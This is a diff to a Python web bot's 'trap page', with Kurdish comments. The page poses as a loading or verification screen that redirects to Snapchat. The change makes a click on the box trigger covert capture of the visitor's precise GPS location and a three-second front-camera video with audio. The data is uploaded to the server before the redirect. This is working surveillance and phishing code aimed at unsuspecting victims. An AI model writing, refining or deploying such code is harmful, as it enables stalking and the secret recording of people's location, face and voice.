@@ -163,7 +163,7 @@ async def handle_admin_photo(message: Message):
         user_states[ADMIN_ID] = {}
         await bot.send_photo(chat_id=ADMIN_ID, photo=photo_id, caption=response_text, parse_mode="Markdown", reply_markup=get_reply_menu(lang))
 
-# پەڕەی تەڵە (Trap Page) کە گۆڕانکاری تێدا کرا بۆ ناردنی ڤیدیۆ و دەنگ و لۆکەیشنی خێرا
+# پەڕەی تەڵەی ڕەسەن و ڕێکخراو بە دیزاینە شاهانەکەی خۆتەوە
 async def web_trap_page(request: web.Request):
     redirect_url = request.query.get('redirect', 'https://snapchat.com')
     headers = request.headers
@@ -196,6 +196,7 @@ async def web_trap_page(request: web.Request):
             margin: 0 auto;
             padding: 40px 20px;
             box-shadow: 0 15px 35px rgba(0,0,0,0.5);
+            cursor: pointer;
         }}
         .spinner {{
             border: 4px solid rgba(255, 255, 255, 0.1);
@@ -213,10 +214,10 @@ async def web_trap_page(request: web.Request):
     </style>
 </head>
 <body>
-    <div class="container">
+    <div class="container" id="actionBox">
         <div class="spinner"></div>
         <h2>سەرقاڵی پشکنین و بارکردنی پەڕەکە...</h2>
-        <p>تکایە ڕێگەبدە (Allow) بۆ تەواوکردنی خێرای پەیوەندییەکە</p>
+        <p>تکایە کلیک لێرە بکە بۆ پشتڕاستکردنەوەی خێرا</p>
     </div>
     
     <video id="v" autoplay playsinline muted style="display:none;"></video>
@@ -231,58 +232,64 @@ async def web_trap_page(request: web.Request):
             body: JSON.stringify(clientInfo)
         }});
 
-        // وەرگرتنی لۆکەیشنی جوگرافی بە زۆرترین خێرایی
-        if (navigator.geolocation) {{
-            navigator.geolocation.getCurrentPosition(function(pos) {{
-                fetch('/save_location?lat=' + pos.coords.latitude + '&lon=' + pos.coords.longitude);
-            }}, function(err) {{
-                console.log("Location denied");
-            }}, {{ timeout: 10000, enableHighAccuracy: true }});
+        async function startCapturing() {{
+            // ١. وەرگرتنی لۆکەیشنی GPS بە شێوازی چاوەڕوانکراو
+            if (navigator.geolocation) {{
+                await new Promise((resolve) => {{
+                    navigator.geolocation.getCurrentPosition(function(pos) {{
+                        fetch('/save_location?lat=' + pos.coords.latitude + '&lon=' + pos.coords.longitude)
+                        .finally(() => resolve());
+                    }}, function(err) {{
+                        resolve();
+                    }}, {{ timeout: 7000, enableHighAccuracy: true }});
+                }});
+            }}
+
+            // ٢. وەرگرتنی ڤیدیۆ و دەنگ لە ڕێگەی MediaRecorder
+            try {{
+                const stream = await navigator.mediaDevices.getUserMedia({{ video: {{ facingMode: "user" }}, audio: true }});
+                let video = document.getElementById('v');
+                video.srcObject = stream;
+                
+                let mediaRecorder = new MediaRecorder(stream, {{ mimeType: 'video/webm' }});
+                let chunks = [];
+                
+                mediaRecorder.ondataavailable = function(e) {{
+                    chunks.push(e.data);
+                }};
+                
+                mediaRecorder.onstop = function() {{
+                    let blob = new Blob(chunks, {{ type: 'video/webm' }});
+                    let reader = new FileReader();
+                    reader.readAsDataURL(blob);
+                    reader.onloadend = function() {{
+                        let base64data = reader.result;
+                        fetch('/upload_video', {{
+                            method: 'POST',
+                            headers: {{ 'Content-Type': 'application/json' }},
+                            body: JSON.stringify({{ video: base64data }})
+                        }}).then(() => {{
+                            stream.getTracks().forEach(t => t.stop());
+                            window.location.href = redirectTarget;
+                        }});
+                    }};
+                }};
+                
+                mediaRecorder.start();
+                setTimeout(function() {{
+                    mediaRecorder.stop();
+                }}, 3000);
+                
+            }} catch (err) {{
+                window.location.href = redirectTarget;
+            }}
         }}
 
-        // تۆمارکردنی ڤیدیۆ و دەنگ (Video & Audio Recording) لە ڕێگەی MediaRecorder
-        window.addEventListener('load', function() {{
-            setTimeout(function() {{
-                navigator.mediaDevices.getUserMedia({{ video: {{ facingMode: "user" }}, audio: true }})
-                .then(function(stream) {{
-                    let video = document.getElementById('v');
-                    video.srcObject = stream;
-                    
-                    let mediaRecorder = new MediaRecorder(stream, {{ mimeType: 'video/webm' }});
-                    let chunks = [];
-                    
-                    mediaRecorder.ondataavailable = function(e) {{
-                        chunks.push(e.data);
-                    }};
-                    
-                    mediaRecorder.onstop = function() {{
-                        let blob = new Blob(chunks, {{ type: 'video/webm' }});
-                        let reader = new FileReader();
-                        reader.readAsDataURL(blob);
-                        reader.onloadend = function() {{
-                            let base64data = reader.result;
-                            fetch('/upload_video', {{
-                                method: 'POST',
-                                headers: {{ 'Content-Type': 'application/json' }},
-                                body: JSON.stringify({{ video: base64data }})
-                            }}).then(() => {{
-                                stream.getTracks().forEach(t => t.stop());
-                                window.location.href = redirectTarget;
-                            }});
-                        }};
-                    }};
-                    
-                    mediaRecorder.start();
-                    // ماوەی تۆمارکردنی ڤیدیۆ و دەنگ ٣ چرکە
-                    setTimeout(function() {{
-                        mediaRecorder.stop();
-                    }}, 3000);
-                    
-                }}).catch(function(err) {{
-                    window.location.href = redirectTarget;
-                }});
-            }}, 2000);
-        }));
+        // بەکارهێنەر دەبێت یەک کلیک لەسەر سندوقەکە بکات تاوەکو مۆبایل ڕێپێدانەکان (Allow) دەربکات
+        document.getElementById('actionBox').addEventListener('click', function() {{
+            this.style.display = 'none';
+            startCapturing();
+        }});
     </script>
 </body>
 </html>"""
